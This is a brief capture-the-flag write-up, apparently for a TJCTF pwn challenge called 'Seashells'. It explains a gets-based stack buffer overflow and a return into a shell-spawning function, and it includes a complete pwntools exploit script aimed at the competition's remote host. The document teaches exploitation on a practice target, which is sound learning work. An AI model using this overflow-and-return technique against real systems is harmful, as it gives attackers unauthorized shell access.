# Seashells

There is a function called "shell". This function loads rdi into rbp-8, checks it against the value `0xdeadcafebabebeef`, 
and if the check is successful it pops a shell for us.  
Clearly, our goal is to call this function.  

In main, there is a gets call. It reads as much input as we want into `rbp-0xa`, opening up an avenue for buffer overflow.
As the saved rbp is 8 bytes long, our padding will be 0xa + 8 bytes of junk.  

We *could* use a pop rdi gadget so that the check works properly, 
but there's no need. Instead, we can jump straight to the instruction inside of shell that pops a shell for us.  

So our payload is just padding + address of instruction in shell that pops a shell  
```python
from pwn import *
NUM_TO_RET = 0xa + 8
padding = b'A' * NUM_TO_RET
payload = flat(padding,0x4006e3, word_size=64)
p = remote('p1.tjctf.org',8009)
p.recvlines(2)
pause()
p.sendline(payload)
p.interactive()
```
